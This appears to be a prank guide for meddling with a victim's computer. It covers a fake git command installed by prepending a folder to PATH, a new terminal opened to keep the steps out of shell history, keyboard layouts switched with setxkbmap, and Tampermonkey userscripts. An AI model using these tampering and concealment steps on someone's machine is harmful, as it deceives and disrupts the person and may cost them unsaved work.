Git

Fake git, will execute in place of the actual git command. Will raise a dummy error when trying to push.
Follow these steps to install it:

  1. Download the fake Git
  2. Open a new command line (this is to prevent the victim from seeing what we did using history)

  3. Type the following command:

    cd ~/Downloads; mv ./git.txt ./git; chmod +x ./git; export PATH=~/Downloads:$PATH

Change keyboard config

Type one of these commands in the terminal:

  • German, only changes a few letters. Subtle and confusing.

    setxkbmap de

  • French, more efficient, but less confusing

    setxkbmap fr

  • Russian and Arabic. Even more confusing, may lead to rage quitting. Be careful with other alphabets, as the victim may not be able to save their work before inevitably restarting their device.

    setxkbmap ru

    setxkbmap ar

JS scripts with Tampermonkey

I might make these into extensions for ease of use. Make sure to read the notice on how to run the scripts.


Method to install scripts
  1. Install Tampermonkey if needed
  2. Get the desired script code using the following buttons
  3. Import the script
    • Open Tampermonkey from Firefox' top bar
    • Click "Create a new script"
    • Replace all contents with the code from the opened js file.
    • Press Ctrl+S, and close Tampermonkey. The script will be active on any newly opened/reloaded page.
